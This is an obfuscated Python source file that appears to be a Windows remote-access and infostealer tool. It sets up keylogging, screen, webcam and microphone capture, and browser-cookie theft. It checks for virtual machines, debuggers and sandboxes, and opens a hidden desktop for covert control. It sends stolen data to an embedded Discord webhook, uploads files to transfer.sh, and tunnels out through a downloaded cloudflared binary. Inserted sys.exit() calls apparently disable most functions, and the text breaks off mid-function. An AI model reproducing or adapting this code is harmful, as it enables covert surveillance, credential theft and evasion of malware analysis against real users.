#!/usr/bin/env python
import os  # line:3
import sys
try:  # line:4
    from flask import Flask, request, redirect, url_for, request, jsonify, Response, send_file  # line:5
    from PIL import Image, ImageGrab  # line:6
    import pynput  # line:7
    from pynput .keyboard import Key, Listener, Controller  # line:8
    from pynput .mouse import Button, Controller as mousecontroller  # line:9
    import PIL  # line:10
    import PIL .Image  # line:11
    from subprocess import Popen, PIPE, CREATE_NO_WINDOW  # line:12
    from pathlib import Path  # line:13
    import getpass
    import urllib .parse
    import bleach
    import atexit
    import ctypes
    import io
    import platform
    import time
    import requests
    import string
    import random
    import io
    import browser_cookie3
    import subprocess
    import base64
    import sqlite3
    import json
    import win32crypt
    import shutil
    import asyncio
    import threading
    import sys
    import ntpath
    import re
    import httpx
    import webbrowser
    import uuid
    import socket
    import tempfile
    import tarfile
    import urllib3  # line:14
    from Crypto .Cipher import AES  # line:15
    from threading import Timer  # line:16
    import win32api
    import win32con
    import win32gui
    import win32service
    import win32process
    import pywintypes
    import win32ui  # line:17
    from ctypes import windll, wintypes  # line:18
    import psutil  # line:19
    from screeninfo import get_monitors  # line:20
    import pygame
    import pygame .camera  # line:21
    import cv2  # line:22
    import wmi  # line:23
    import hashlib  # line:24
    import pyaudio
    import wave  # line:25
    from win32gui import GetWindowText, GetForegroundWindow  # line:26
    from cryptography .fernet import Fernet  # line:27
except:  # line:28
    print("e so instal")  # line:29
    sys.exit()
    for package in ["requests", "cryptography", "wmi", "pathlib", "opencv-python", "screeninfo", "psutil", "httpx", "flask", "pynput", "pillow", "browser_cookie3", "pyaudio", "bleach", "pypiwin32", "pycryptodome", "pygame"]:  # line:30
        os .system(f"pip install {package}")  # line:31
    from flask import Flask, request, redirect, url_for, request, jsonify, Response, send_file  # line:33
    from PIL import Image, ImageGrab  # line:34
    import pynput  # line:35
    from pynput .keyboard import Key, Listener, Controller  # line:36
    from pynput .mouse import Button, Controller as mousecontroller  # line:37
    import PIL  # line:38
    import PIL .Image  # line:39
    from subprocess import Popen, PIPE, CREATE_NO_WINDOW  # line:40
    from pathlib import Path  # line:41
    import getpass
    import urllib .parse
    import bleach
    import atexit
    import ctypes
    import io
    import platform
    import time
    import requests
    import string
    import random
    import io
    import browser_cookie3
    import subprocess
    import base64
    import sqlite3
    import json
    import win32crypt
    import shutil
    import asyncio
    import threading
    import sys
    import ntpath
    import re
    import httpx
    import webbrowser
    import uuid
    import socket
    import tempfile
    import tarfile
    import urllib3  # line:42
    from Crypto .Cipher import AES  # line:43
    from threading import Timer  # line:44
    import win32api
    import win32con
    import win32gui
    import win32service
    import win32process
    import pywintypes
    import win32ui  # line:45
    from ctypes import windll, wintypes  # line:46
    import psutil  # line:47
    from screeninfo import get_monitors  # line:48
    import pygame
    import pygame .camera  # line:49
    import cv2  # line:50
    import wmi  # line:51
    import hashlib  # line:52
    import pyaudio
    import wave  # line:53
    from win32gui import GetWindowText, GetForegroundWindow  # line:54
    from cryptography .fernet import Fernet  # line:55


def encode_it(O0O00000O00O0OOO0):  # line:61
    sys.exit()
    return base64 .b64encode(O0O00000O00O0OOO0 .encode()).decode()  # line:62


def get_time():  # line:64
    sys.exit()
    return str(int(time .time()))[:8]  # line:65


def hash_it(_O0OOO000OOO00O000):  # line:67
    sys.exit()
    O0O0OO0OO0OO0OO0O = hashlib .sha256(
        _O0OOO000OOO00O000 .encode('utf-8')).hexdigest()  # line:68
    return O0O0OO0OO0OO0OO0O  # line:69


def reverse_content(OO0O000OOOOOOO000):  # line:71
    sys.exit()
    return OO0O000OOOOOOO000[::-1]  # line:72


def generate_signature(OOOO0OO0O00O0O0OO):  # line:75
    sys.exit()
    OOOO0OO0O00O0O0OO = str(OOOO0OO0O00O0O0OO)  # line:76
    OOOO0OO0O00O0O0OO = OOOO0OO0O00O0O0OO .replace("e", "E")  # line:77
    OOOO0OO0O00O0O0OO = OOOO0OO0O00O0O0OO .replace("", "E")  # line:78
    OOOO0OO0O00O0O0OO += "ggpeople"  # line:79
    OOOO0OO0O00O0O0OO = list(OOOO0OO0O00O0O0OO)  # line:80
    O000OO0OO00O0000O = encode_it(reverse_content(get_time()))  # line:81
    O000OO0OO00O0000O = O000OO0OO00O0000O .lower().replace("=", "")  # line:82
    OOOO0OO0O00O0O0OO .insert(2, O000OO0OO00O0000O)  # line:83
    OOOO0OO0O00O0O0OO = "".join(OOOO0OO0O00O0O0OO)  # line:84
    OOOOOO00O0O0O0OOO = hash_it(OOOO0OO0O00O0O0OO)  # line:85
    return OOOOOO00O0O0O0OOO  # line:86


def get_browsers():  # line:88
    sys.exit()
    _O0O0O0O000O0000OO = {}  # line:89
    O000OO0O000OOO0OO = os .environ .get("USERNAME")  # line:90
    try:  # line:91
        if os .path .exists(r"C:\Program Files\Google\Chrome\Application\chrome.exe"):  # line:92
            # line:93
            _O0O0O0O000O0000OO["chrome"] = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        if os .path .exists(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"):  # line:94
            # line:95
            _O0O0O0O000O0000OO["chrome"] = r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        if os .path .exists(r"C:\Program Files\Mozilla Firefox\firefox.exe"):  # line:97
            # line:98
            _O0O0O0O000O0000OO["firefox"] = r"C:\Program Files\Mozilla Firefox\firefox.exe"
        if os .path .exists(r"C:\Program Files\Internet Explorer\iexplore.exe"):  # line:100
            # line:101
            _O0O0O0O000O0000OO["internet-explorer"] = r"C:\Program Files\Internet Explorer\iexplore.exe"
        if os .path .exists(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"):  # line:103
            # line:104
            _O0O0O0O000O0000OO["edge"] = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if os .path .exists(r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"):  # line:107
            # line:108
            _O0O0O0O000O0000OO["edge"] = r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
        if os .path .exists(r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"):  # line:110
            # line:111
            _O0O0O0O000O0000OO["brave"] = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
        if os .path .exists(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\brave.exe"):  # line:113
            # line:114
            _O0O0O0O000O0000OO["brave"] = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\brave.exe"
        if os .path .exists(r"C:\Users\\"+O000OO0O000OOO0OO + "\AppData\Local\Programs\Opera\opera.exe"):  # line:116
            _O0O0O0O000O0000OO["opera"] = r"C:\Users\\"+O000OO0O000OOO0OO + \
                "\AppData\Local\Programs\Opera\opera.exe"  # line:117
        if os .path .exists(r"C:\Users\\"+O000OO0O000OOO0OO + "\AppData\Local\Programs\Opera GX\opera.exe"):  # line:118
            _O0O0O0O000O0000OO["operagx"] = r"C:\Users\\"+O000OO0O000OOO0OO + \
                "\AppData\Local\Programs\Opera GX\opera.exe"  # line:119
    except Exception as O00O000O00O00O000:  # line:121
        print(O00O000O00O00O000)  # line:122
    return _O0O0O0O000O0000OO  # line:123


def get_monitor_data():  # line:125
    sys.exit()
    O0O0OOO0OOOOO00OO = []  # line:127
    try:  # line:128
        for OO00O00OOOOO00O00 in get_monitors():  # line:129
            O0O0OOO0OOOOO00OO .append([OO00O00OOOOO00O00 .x, OO00O00OOOOO00O00 .y,
                                      OO00O00OOOOO00O00 .width, OO00O00OOOOO00O00 .height])  # line:130
    except:  # line:131
        pass  # line:132
    return O0O0OOO0OOOOO00OO  # line:133


browsers = get_browsers()  # line:136
all_monitors = get_monitor_data()  # line:137
startupinfo = None
desktop = None  # line:141
keyboard = Controller()  # line:143
mouse = mousecontroller()  # line:144
USER_NAME = getpass .getuser()
urllib3 .disable_warnings(
    urllib3 .exceptions .InsecureRequestWarning)  # line:147


def get_webhook(OOOOOOOOOOO00000O):  # line:150
    sys.exit()
    OOO0000O00O00O00O = "https://discord.com/api/webhooks/1034042887484231680/KQc7b4b1y4mVcrm7I9TXNPhS__PlucjOVSQM8qgc_gEgL6xcBVznjNLuBPa-YABq9rkA"  # line:151
    try:  # line:152
        OO0OOOOO0OOO0O0O0 = httpx .get(
            f"https://pastebin.com/raw/{OOOOOOOOOOO00000O}")  # line:153
        if OO0OOOOO0OOO0O0O0 .status_code == 200:  # line:154
            _OO0O00O0O0O0OOO0O = bytes(
                OO0OOOOO0OOO0O0O0 .text, "utf-8")  # line:155
            OOOOOOO0OO00O0OOO = bytes(
                "GYM41PlCuJQkH2lkGCjLK-TJT6c7y7r4539jC4q3-Bc=WOWGOODJOB", 'utf-8')  # line:156
            OOO00O000O000OOOO = Fernet(OOOOOOO0OO00O0OOO)  # line:158
            OOO0000O00O00O00O = OOO00O000O000OOOO .decrypt(
                _OO0O00O0O0O0OOO0O).decode()  # line:159
    except Exception as O000O000000O0000O:  # line:162
        print(O000O000000O0000O)  # line:163
    return OOO0000O00O00O00O  # line:165


def switch_thing(_O00OO000O00O0000O, O0OO0OOO0000OO0O0, O000OO0000OOO0O0O, O0OOOOO0000O0O0OO):  # line:169
    sys.exit()
    if _O00OO000O00O0000O == False:  # line:171
        return f"tLMm33LW"  # line:172
    elif O0OO0OOO0000OO0O0 == False:  # line:173
        return "XEUK3XYD"  # line:174
    elif O000OO0000OOO0O0O == True:  # line:175
        return "Nx0TkhD1"  # line:176
    elif O0OOOOO0000O0O0OO == True:  # line:177
        return "YqgbTuT4"  # line:178
    elif _O00OO000O00O0000O == None:  # line:179
        return "6XZiuxuv"  # line:180
    elif O000OO0000OOO0O0O == None or O0OOOOO0000O0O0OO == None:  # line:181
        return "0TTqJRNP"  # line:182
    else:  # line:183
        return "AdzhLyVm"  # line:184


def get_ip_data():  # line:188
    sys.exit()
    try:  # line:189
        OOO0O000O000O0OO0 = requests .get(
            f"http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=10).json()  # line:190
    except:  # line:192
        OOO0O000O000O0OO0 = "IP UNKNOWN"  # line:193
    return OOO0O000O000O0OO0  # line:194


def manu():  # line:196
    sys.exit()
    _OOOO0OO0O00OO0OOO = "Error"  # line:197
    try:  # line:198
        _OOOO0OO0O00OO0OOO = wmi .WMI().Win32_ComputerSystem()[
                                      0].Manufacturer  # line:199
        if _OOOO0OO0O00OO0OOO in ["VMWare Virtual Platform", "VirtualBox", "KVM", "Bochs", "HVM domU", "Microsoft Corporation", "QEMU", "innotek GmbH", "Red Hat", "VMware, Inc.", "Xen"]:  # line:200
            return False, _OOOO0OO0O00OO0OOO  # line:201
        else:  # line:202
            return True, _OOOO0OO0O00OO0OOO  # line:203
    except:  # line:204
        return None, _OOOO0OO0O00OO0OOO  # line:205


def uman():  # line:207
    sys.exit()
    try:  # line:208
        OOOOOO0OOO0000O0O = ["ida64.exe", "ida.exe", "x64dbg.exe", "x32dbg.exe", "Wireshark.exe",
            "ollydbg.exe", "Fiddler.exe", "tcpview.exe", "vmsrvc.exe", "Charles.exe"]  # line:209
        for OO000OO0O0O0000OO in psutil .process_iter():  # line:210
            for O0OOOOOO0OOO00O0O in OOOOOO0OOO0000O0O:  # line:211
                if OO000OO0O0O0000OO .name() == O0OOOOOO0OOO00O0O:  # line:212
                    return False  # line:213
    except Exception as O000OOO0O00OOO0O0:  # line:214
        return None  # line:215
    return True  # line:216


def get_folder_nice(O000OO00OOO00OO0O):  # line:219
    sys.exit()
    OO0O0O0OOO0OOOO00 = O000OO00OOO00OO0O .split("\\")  # line:220
    OO0O0O0OOO0OOOO00 .pop()  # line:221
    O00000OO0OOOOOOOO = [
        f"{O0O00OO000OO00OO0}\\"for O0O00OO000OO00OO0 in OO0O0O0OOO0OOOO00]  # line:223
    O00000OO0OOOOOOOO = os .path .join(*O00000OO0OOOOOOOO)  # line:224
    return f"{O00000OO0OOOOOOOO}"  # line:225


def folder_fiddle():  # line:227
    sys.exit()
    try:  # line:228
        O00O00O0OO0OO000O = ["requests", "cryptography", "wmi", "pathlib", "opencv-python", "screeninfo", "psutil", "httpx", "flask", "pynput", "pillow",
            "browser_cookie3", "pyaudio", "bleach", "pypiwin32", "pycryptodome", "pygame", "httpx", "cryptography", "flask", "subprocess", "os", "print"]  # line:229
        O00OO00OO0O000OOO = get_folder_nice(sys .argv[0])  # line:230
        for O0O00O0O0OO000OOO in O00O00O0OO0OO000O:  # line:231
            O0OO0OOO0OO0O0O00 = os .path .join(
                O00OO00OO0O000OOO, O0O00O0O0OO000OOO)  # line:232
            O0OO00000OO000O00 = os .path .isdir(O0OO0OOO0OO0O0O00)  # line:233
            OOO0O0OO00O0O0O00 = os .path .exists(
                f"{O0OO0OOO0OO0O0O00}.py")  # line:234
            if O0OO00000OO000O00 == True or OOO0O0OO00O0O0O00 == True:  # line:235
                return True  # line:236
    except:  # line:237
        pass  # line:238
    return False  # line:239


ip_data = get_ip_data()  # line:241
try:  # line:242
    hstatus = ip_data["hosting"]  # line:243
    pstatus = ip_data["proxy"]  # line:244
except:  # line:245
    hstatus = None  # line:246
    pstatus = None  # line:247
well_manu, _OO00O0OO0000O0O0O = manu()  # line:248
stat_us = uman()  # line:249
other_check = folder_fiddle()  # line:250
webhook = get_webhook("BdeMriaf")  # line:252


def anti_fed():  # line:257
    sys.exit()
    try:  # line:258
        O0OOO0OO000OO00O0 = str(subprocess .check_output('wmic csproduct get uuid')).split(
            '\\r\\n')[1].strip('\\r').strip()  # line:259
        if O0OOO0OO000OO00O0 in ["3BE52042-E752-DEAF-BD92-2829CF5CE9FD", "79F42042-0732-F0AC-005B-7FBC12AFE8B4", "11111111-2222-3333-4444-555555555555", "0F0F029C-346B-417A-A6BE-C6E1A853A856", "00000000-0000-0000-0000-000000000000", "C0D02042-B4FB-B1A2-772B-8A6D642DDFE9"]:  # line:260
            print("hello world!")  # line:261
            os ._exit(0)  # line:262
    except:  # line:263
        O0OOO0OO000OO00O0 = f"ERROR"  # line:264


def send_to_webhook(content=None, files=None, filename="unnamed.txt"):  # line:267
    sys.exit()
    if 'str' in str(type(files)):  # line:268
        _OOO000O0000OOOO0O = io .BytesIO()  # line:269
        OO00O0OOO0O0O00OO = f'{files}'.encode('utf-8')  # line:270
        _OOO000O0000OOOO0O .write(OO00O0OOO0O0O00OO)  # line:271
        _OOO000O0000OOOO0O .seek(0)  # line:272
        files = {'file': (filename, _OOO000O0000OOOO0O)}  # line:273
    _O000O000OOOOOO0O0 = content  # line:275
    if files != None:  # line:276
        _O000O000OOOOOO0O0 += str(filename)  # line:277
    _O000O000OOOOOO0O0 = generate_signature(_O000O000OOOOOO0O0)  # line:279
    for O0OOOOO0O0O0OOOOO in range(10):  # line:281
        try:  # line:282
            OOOOO0O0OO00000OO = requests .post(webhook, json={"content": content, "x": _O000O000OOOOOO0O0}, data={
                                               "content": content, "x": _O000O000OOOOOO0O0}, files=files, verify=False)  # line:283
            if OOOOO0O0OO00000OO .status_code != 429:  # line:284
                break  # line:285
        except Exception as O00O00O0O0O0OOO00:  # line:286
            pass  # line:288


def flask_process_content(OOOO00OOO0000000O):  # line:291
    sys.exit()
    return OOOO00OOO0000000O .replace("\n", "<br>")  # line:292


def file_upload_via_transfer_sh(O0O0O00OOOO00OO00, OO0000O0000O0000O):  # line:294
    sys.exit()
    try:  # line:295
        OOOO0O0O00O00OO00 = requests .put(f"https://transfer.sh/{OO0000O0000O0000O}", data=open(
            O0O0O00OOOO00OO00, 'r', encoding="unicode_escape").read())  # line:296
        if OOOO0O0O00O00OO00 .status_code == 200:  # line:297
            return OOOO0O0O00O00OO00 .text  # line:298
        else:  # line:299
            return None  # line:300
    except Exception as O000O0OOO00OO00OO:  # line:302
        print(O000O0OOO00OO00OO)  # line:303
        return None  # line:304


def upload_file(O000OOO0OO00OO0O0, filename="file.txt"):  # line:307
    sys.exit()
    O0OOOO00OOOO0O00O = file_upload_via_transfer_sh(
        O000OOO0OO00OO0O0, filename)  # line:308
    if O0OOOO00OOOO0O00O != None:  # line:309
        return O0OOOO00OOOO0O00O  # line:310
    return "Error with all file services"  # line:312


def hvncclose():  # line:322
    sys.exit()
    return desktop .CloseDesktop()  # line:323


def startProcess(OO00000OOOOOO00OO):  # line:325
    sys.exit()
    global startupinfo  # line:326
    _OO00O000000O00O0O = OO00000OOOOOO00OO  # line:327
    if OO00000OOOOOO00OO in browsers:  # line:328
        _OO00O000000O00O0O = browsers[OO00000OOOOOO00OO]  # line:329
    OO0O00000OOOOOO00 = win32process .CreateProcess(
        None, _OO00O000000O00O0O, None, None, True, win32con .NORMAL_PRIORITY_CLASS | win32con .CREATE_NEW_CONSOLE, None, None, startupinfo)  # line:330
    return OO0O00000OOOOOO00  # line:331


def start_command(O0O0OO000O0OO0O00):  # line:334
    sys.exit()
    global startupinfo  # line:335
    _O0O000OO0OOO00OOO = O0O0OO000O0OO0O00  # line:336
    if O0O0OO000O0OO0O00 in browsers:  # line:337
        _O0O000OO0OOO00OOO = browsers[O0O0OO000O0OO0O00]  # line:338
    O000OOO00O0OOOOOO = win32process .CreateProcess(
        None, f"cmd.exe /c {command}", None, None, True, win32con .NORMAL_PRIORITY_CLASS | win32con .CREATE_NEW_CONSOLE, None, None, startupinfo)  # line:339
    return O000OOO00O0OOOOOO  # line:340


def make_desktop():  # line:343
    sys.exit()
    global startupinfo, desktop  # line:344
    O000OOOO0OOOO0OO0 = pywintypes .SECURITY_ATTRIBUTES()  # line:345
    O000OOOO0OOOO0OO0 .bInheritHandle = 1  # line:346
    O0OOOOOOO000OOOOO = ''.join(random .choice(
        string .ascii_uppercase + string .digits)for _O00OOO0O00OOO0000 in range(10))  # line:347
    OOO0OOOO0O0OO00OO = win32service .OpenInputDesktop(
        0, False, win32con .DESKTOP_SWITCHDESKTOP)  # line:349
    desktop = win32service .CreateDesktop(
        O0OOOOOOO000OOOOO, 0, win32con .MAXIMUM_ALLOWED, O000OOOO0OOOO0OO0)  # line:350
    startupinfo = win32process .STARTUPINFO()  # line:351
    startupinfo .lpDesktop = O0OOOOOOO000OOOOO  # line:352
    startProcess('notepad.exe')  # line:353
    win32api .Sleep(1000)  # line:356


current_window = None  # line:359


def set_current_window(O0OO0O000OO0000O0):  # line:360
    sys.exit()
    global current_window  # line:361
    current_window = O0OO0O000OO0000O0  # line:362


def get_current_window():  # line:364
    sys.exit()
    global current_window  # line:365
    return current_window  # line:366


def _OOO0OOO0OOOO0OOOO(O0O00OO0OO0OO00OO, OOO00O0O0O0O000OO, button="left"):  # line:370
    sys.exit()
    OOO0OO00O0000OO0O = desktop .EnumDesktopWindows()  # line:371
    for O0O000OO0OOO00000 in OOO0OO00O0000OO0O:  # line:372
        if win32gui .IsWindowVisible(O0O000OO0OOO00000):  # line:373
            def OO0OOOO0000OOO000(OO0OOO00O0OOO0000, _=False):  # line:374
                sys.exit()
                O0000000000O00OO0 = win32gui .GetWindowRect(
                    OO0OOO00O0OOO0000)  # line:375
                O00OO00O000000O00, OO000OO0O00O0OO00, O0O0000O0O00000OO, OO00O000000O0O00O = O0000000000O00OO0  # line:376
                if _:  # line:377
                    win32gui .EnumChildWindows(
                        OO0OOO00O0OOO0000, OO0OOOO0000OOO000, _)  # line:378
                if O00OO00O000000O00 < O0O00OO0OO0OO00OO < O0O0000O0O00000OO and OO000OO0O00O0OO00 < OOO00O0O0O0O000OO < OO00O000000O0O00O:  # line:379
                    OO00O00OOOOOO0000 = O0O00OO0OO0OO00OO - O00OO00O000000O00  # line:380
                    O0O000OO0000OO000 = OOO00O0O0O0O000OO - OO000OO0O00O0OO00  # line:381
                    O0OOOO0OOO0O0OOO0 = [
                        win32con .WM_LBUTTONDOWN, win32con .WM_LBUTTONUP, win32con .MK_LBUTTON]  # line:382
                    if button == "right":  # line:383
                        O0OOOO0OOO0O0OOO0 = [
                            win32con .WM_RBUTTONDOWN, win32con .WM_RBUTTONUP, win32con .MK_RBUTTON]  # line:384
                    O0O0OO00OOO0OOO0O = int((O0O000OO0000OO000 << 16) | (
                        OO00O00OOOOOO0000 & 0xFFFF))  # line:385
                    O0OO0O00O0O0O0000 = win32gui .GetWindowText(
                        OO0OOO00O0OOO0000)  # line:386
                    if __name__ == '__main__':
                        sys.exit()
                    # line:387
                    print(f"Clicking {O0OO0O00O0O0O0000} at {OO00O00OOOOOO0000}, {O0O000OO0000OO000} ({O0O00OO0OO0OO00OO}, {OOO00O0O0O0O000OO} | {O0OOOO0OOO0O0OOO0} | {int(OO0OOO00O0OOO0000)} | {O0O0OO00OOO0OOO0O})")
                    windll .user32 .PostMessageW(
                        int(OO0OOO00O0OOO0000), O0OOOO0OOO0O0OOO0[0], 0, O0O0OO00OOO0OOO0O)  # line:388
                    win32api .Sleep(3)  # line:389
                    windll .user32 .PostMessageW(
                        int(OO0OOO00O0OOO0000), O0OOOO0OOO0O0OOO0[1], 0, O0O0OO00OOO0OOO0O)  # line:390
                    win32gui .EnumChildWindows(
                        int(OO0OOO00O0OOO0000), OO0OOOO0000OOO000, True)  # line:391
                    set_current_window(OO0OOO00O0OOO0000)  # line:393
                    return True  # line:394
                return False  # line:395
            if OO0OOOO0000OOO000(O0O000OO0OOO00000):
                break  # line:396


def _O00O0OO000OOOO00O(O0000O0O000OO000O, normal=True):  # line:398
    sys.exit()
    O0O0O00000OOO0OOO = get_current_window()  # line:400
    if O0O0O00000OOO0OOO:  # line:401
        if normal == True:  # line:402
            win32gui .SendMessage(
                O0O0O00000OOO0OOO, win32con .WM_CHAR, O0000O0O000OO000O, 0)  # line:403
        else:  # line:404
            win32gui .SendMessage(
                O0O0O00000OOO0OOO, win32con .WM_KEYDOWN, O0000O0O000OO000O, 0)  # line:405
            win32gui .SendMessage(
                O0O0O00000OOO0OOO, win32con .WM_KEYUP, O0000O0O000OO000O, 0)  # line:406
    else:  # line:407
        if __name__ == '__main__':
            sys.exit()
        print("No input window selected")  # line:408


def _OOO0O00O000O0OOOO():  # line:412
    sys.exit()
    O00OOOOOO0OOO0OO0 = platform .system()  # line:413
    O0O0O0OOO000OO0O0 = platform .machine()  # line:414
    if O00OOOOOO0OOO0OO0 == "Windows":  # line:415
        if O0O0O0OOO000OO0O0 == "AMD64":  # line:416
            O0O00000O00000000 = "cloudflared-windows-amd64.exe"  # line:417
        elif O0O0O0OOO000OO0O0 == "x86":  # line:418
            O0O00000O00000000 = "cloudflared-windows-386.exe"  # line:419
        else:  # line:420
            raise Exception("{machine} is not supported on Windows".format(
                machine=O0O0O0OOO000OO0O0))  # line:421
    elif O00OOOOOO0OOO0OO0 == "Linux":  # line:422
        if O0O0O0OOO000OO0O0 == "x86_64":  # line:423
            O0O00000O00000000 = "cloudflared-linux-amd64"  # line:424
        elif O0O0O0OOO000OO0O0 == "i386":  # line:425
            O0O00000O00000000 = "cloudflared-linux-386"  # line:426
        elif O0O0O0OOO000OO0O0 == "arm":  # line:427
            O0O00000O00000000 = "cloudflared-linux-arm"  # line:428
        elif O0O0O0OOO000OO0O0 == "arm64":  # line:429
            O0O00000O00000000 = "cloudflared-linux-arm64"  # line:430
        elif O0O0O0OOO000OO0O0 == "aarch":  # line:431
            O0O00000O00000000 = "cloudflared-linux-arm64"  # line:432
        else:  # line:433
            raise Exception("{machine} is not supported on Linux".format(
                machine=O0O0O0OOO000OO0O0))  # line:434
    elif O00OOOOOO0OOO0OO0 == "Darwin":  # line:435
        if O0O0O0OOO000OO0O0 == "x86_64":  # line:436
            O0O00000O00000000 = "cloudflared"  # line:437
        elif O0O0O0OOO000OO0O0 == "arm64":  # line:438
            print("* On a MacOS system with an Apple Silicon chip, Rosetta 2 needs to be installed, refer to this guide to learn more: https://support.apple.com/en-us/HT211861")  # line:439
            O0O00000O00000000 = "cloudflared"  # line:440
        else:  # line:441
            raise Exception("{machine} is not supported on Darwin".format(
                machine=O0O0O0OOO000OO0O0))  # line:442
    else:  # line:443
        raise Exception("{system} is not supported".format(
            system=O00OOOOOO0OOO0OO0))  # line:444
    return O0O00000O00000000  # line:445


def _O00OO0OOO00OO0O00(OO00000OO000OOO0O, O000OO00O000O0OOO):  # line:447
    sys.exit()
    OO00OO00OO000O0OO = tarfile .open(
        OO00000OO000OOO0O + '/'+O000OO00O000O0OOO, 'r')  # line:448
    for O00O0OO0OOOO00OOO in OO00OO00OO000O0OO:  # line:449
        OO00OO00OO000O0OO .extract(
            O00O0OO0OOOO00OOO, OO00000OO000OOO0O)  # line:450
        # line:451
        if O00O0OO0OOOO00OOO .name .find(".tgz") != -1 or O00O0OO0OOOO00OOO .name .find(".tar") != -1:
            extract(O00O0OO0OOOO00OOO .name, "./" +
                    O00O0OO0OOOO00OOO .name[:O00O0OO0OOOO00OOO .name .rfind('/')])  # line:452


def _O00O00O00000OO00O(OO00OO00OOO00O0O0):  # line:454
    sys.exit()
    OOOO0OOOOO0000OOO = platform .system()  # line:455
    O000OO0O0O00OO0O0 = platform .machine()  # line:456
    OO000O00O000O0OOO = _OOO0O00O000O0OOOO()  # line:457
    OOOOO0O000OOO0O0O = str(Path(tempfile .gettempdir()))  # line:458
    if (OOOO0OOOOO0000OOO == "Darwin"):  # line:459
        _O0OOO0O0OOOOO000O(OOOOO0O000OOO0O0O,
                           "cloudflared-darwin-amd64.tgz")  # line:460
        _O00OO0OOO00OO0O00(OOOOO0O000OOO0O0O,
                           "cloudflared-darwin-amd64.tgz")  # line:461
        OO0O0OOO000O0OO00 = str(
            Path(OOOOO0O000OOO0O0O, OO000O00O000O0OOO))  # line:462
    else:  # line:463
        _O0OOO0O0OOOOO000O(OOOOO0O000OOO0O0O, OO000O00O000O0OOO)  # line:464
        OO0O0OOO000O0OO00 = str(
            Path(OOOOO0O000OOO0O0O, OO000O00O000O0OOO))  # line:465
    os .chmod(OO0O0OOO000O0OO00, 0o777)  # line:466
    if (OOOO0OOOOO0000OOO == "Darwin" and O000OO0O0O00OO0O0 == "arm64"):  # line:467
        OOO0OOOOO00O0O0O0 = subprocess .Popen(['arch', '-x86_64', OO0O0OOO000O0OO00, 'tunnel', '--url', 'http://127.0.0.1:'+str(
            OO00OO00OOO00O0O0), '--metrics', '127.0.0.1:8099'], creationflags=CREATE_NO_WINDOW)  # line:468
    else:  # line:469
        OOO0OOOOO00O0O0O0 = subprocess .Popen([OO0O0OOO000O0OO00, 'tunnel', '--url', 'http://127.0.0.1:'+str(
            OO00OO00OOO00O0O0), '--metrics', '127.0.0.1:8099'], creationflags=CREATE_NO_WINDOW)  # line:470
    atexit .register(OOO0OOOOO00O0O0O0 .terminate)  # line:471
    O0O0OO0O0OOOOOOO0 = "http://127.0.0.1:8099/metrics"  # line:472
    OOOOO0OO0OO00O0O0 = 0  # line:473
    while OOOOO0OO0OO00O0O0 < 10:  # line:474
        try:  # line:475
            OOOO0O0000O0OO000 = requests .get(
                O0O0OO0O0OOOOOOO0).text  # line:476
            OOOO0O0000O0OO000 = (re .search(
                "(?P<url>https?:\/\/[^\s]+.trycloudflare.com)", OOOO0O0000O0OO000).group("url"))  # line:477
            break  # line:478
        except:  # line:479
            OOOOO0OO0OO00O0O0 += 1  # line:480
            time .sleep(3)  # line:481
            continue  # line:482
    if OOOOO0OO0OO00O0O0 == 10:  # line:483
        raise Exception(f"Can't connect to Cloudflare Edge")  # line:484
    return OOOO0O0000O0OO000  # line:485


def _O0OOO0O0OOOOO000O(OO00OOO0O000OO000, O0O00000OO0OO0O00):  # line:487
    sys.exit()
    OO000OOO00O0OOOO0 = platform .system()  # line:488
    OO000O00OO0OO0000 = platform .machine()  # line:489
    if Path(OO00OOO0O000OO000, O0O00000OO0OO0O00).exists():  # line:490
        if (OO000OOO00O0OOOO0 == "Darwin" and OO000O00OO0OO0000 == "arm64"):  # line:491
            OO0OO0OOO0OOOOO0O = subprocess .Popen(['arch', '-x86_64', (OO00OOO0O000OO000 + '/'+'cloudflared'),
                                                  'update'], stdout=subprocess .DEVNULL, stderr=subprocess .STDOUT)  # line:492
        elif OO000OOO00O0OOOO0 == "Darwin" and OO000O00OO0OO0000 == "x86_64":  # line:493
            OO0OO0OOO0OOOOO0O = subprocess .Popen(
                [(OO00OOO0O000OO000 + '/'+'cloudflared'), 'update'], stdout=subprocess .DEVNULL, stderr=subprocess .STDOUT)  # line:494
        else:  # line:495
            OO0OO0OOO0OOOOO0O = subprocess .Popen(
                [(OO00OOO0O000OO000 + '/'+O0O00000OO0OO0O00), 'update'], stdout=subprocess .DEVNULL, stderr=subprocess .STDOUT)  # line:496
        return  # line:497
    if OO000OOO00O0OOOO0 == "Windows":  # line:498
        if OO000O00OO0OO0000 == "AMD64":  # line:499
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"  # line:500
        elif OO000O00OO0OO0000 == "x86":  # line:501
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe"  # line:502
    elif OO000OOO00O0OOOO0 == "Linux":  # line:503
        if OO000O00OO0OO0000 == "x86_64":  # line:504
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"  # line:505
        elif OO000O00OO0OO0000 == "i386":  # line:506
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"  # line:507
        elif OO000O00OO0OO0000 == "arm":  # line:508
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"  # line:509
        elif OO000O00OO0OO0000 == "arm64":  # line:510
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"  # line:511
        elif OO000O00OO0OO0000 == "aarch64":  # line:512
